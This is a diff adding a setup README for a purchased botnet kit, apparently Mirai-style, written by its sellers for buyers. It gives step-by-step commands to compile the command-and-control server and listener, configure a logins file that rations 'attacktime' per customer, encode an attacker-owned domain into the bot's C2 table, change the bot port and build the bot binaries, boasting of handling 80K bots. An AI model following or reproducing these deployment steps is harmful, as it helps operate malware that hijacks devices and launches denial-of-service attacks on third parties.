@@ -1,0 +1,66 @@
+Thanks for buyign....
+If you buy something better HMU 
+
+Dont skidrip / resell / leak this shit
+made by franco and wicked 
+
+
+
+
+
+
+
+
+
+
+REQUIREMENTS SYSTEM
+- DEBIAN 10
+- 8GB RAM (IF YOU ARE LOADING ALOT OF BOTS) USE TO HANDLE 80K WITH NO PROBLEM
+- 1GBPS UPLINK
+
+okay so this is setp by step how to setup botnet
+
+
+step 1 (compiling the cnc)
+- to compile the cnc you use this command: gcc cnc.c -o cnc -pthread
+then it should have the output called cnc in the folder.
+
+now you have to use golang 13 to be able to download and compile the listen.go
+to compile use this command: go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords
+
+okay now if you succesfully compiled it open it on a screen command
+
+ulimit -n999999; ulimit -u9999999; ./cnc 55650 1337 750
+ulimit -n999999; ulimit -u9999999; ./listen
+
+the logins.txt as you see theres an existing admin user there
+the format is
+
+username password -1 attacktime cooldowntime all 0
+now if you set 0 to 1 it will be admin so for current users just use 0
+
+-------------------------------
+
+step 2 (compiling the bot)
+
+- go to tools/enc.c to compile it use command: gcc enc.c -o enc
+
+now buy a domain for the bot then do this command: ./enc string "yourdomain.com"
+
+now there will be a hex and a number so add it on bot/table.c
+TABLE_CNC_DOMAIN
+
+now go to bot/main.c and change the bot port
+go to line 329 (srv_addr.sin_port = htons(44629);)
+
+change it to anything you like
+
+use build.sh to compile the bot
+
+also before running build.sh run this command: dos2unix build.sh; sh build.sh
+
+if you dont have dox2unix install it
+
+apt install dos2unix -y
+
+and your setup is done.
